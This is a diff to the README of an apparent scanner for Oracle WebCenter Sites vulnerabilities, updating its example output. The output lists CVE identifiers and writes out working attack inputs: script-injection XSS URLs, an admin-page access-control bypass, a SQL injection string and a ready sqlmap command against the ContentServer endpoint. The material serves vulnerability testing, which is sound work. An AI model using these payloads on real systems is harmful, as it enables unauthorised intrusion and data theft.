@@ -11,21 +11,25 @@ python3 wcs_scanner.py http://example.com
 **Example output**
 ```text
 [!] Start scanning http://example.com
+[*] Using proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
 
 [*] Look for default login page
 [-] Default login page not found
 
-[*] Testing XSS
-[+] Possible XSS found: http://example.com/cs/Satellite?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script>
-[...]
+[*] Testing CVE-2018-2791 and CVE-2018-3238 - Multiple XSS
+[+] Vulnerable to CVE-2018-2791 (Multiple XSS)
+    Payload: http://example.com?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22><script>alert(24)</script>
+[+] Vulnerable to CVE-2018-3238 (Multiple XSS)
+    Payload: http://example.com?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq%22><script>alert(24)</script>
 
-[*] Testing Broken Access Control
-[+] Possible Broken Access Control found: http://example.com/cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences
+[*] Testing CVE-2019-2578 - Broken Access Control
+[+] Vulnerable to CVE-2019-2578 (Broken Access Control)
+    Evidence: http://example.com?pagename=OpenMarket/Xcelerate/Admin/WebReferences
 
 [*] Testing SQL Injection
-[+] Possible SQLi found POST /cs/ContentServer {'_authkey_': '...', 'pagename': 'OpenMarket/Xcelerate/Admin/WebReferences', 'op': 'search', 'urlsToDelete': '', 'resultsPerPage': 25, 'searchChoice': 'webroot', 'searchText': "' or '1'='1 -- "}
+[+] Vulnerable to CVE-2019-2579 (SQL Injection)
 [*] You should test this with sqlmap:
-sqlmap --dbms Oracle --url http://example.com/cs/ContentServer --data "_authkey_=...&pagename=OpenMarket/Xcelerate/Admin/WebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=*" --cookie "JSESSIONID=..." --technique U
+sqlmap --dbms Oracle --url http://example.com/cs/ContentServer --data '_authkey_=...&pagename=OpenMarket/Xcelerate/Admin/WebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=*' --cookie 'JSESSIONID=...' --technique U
 
 ```
 
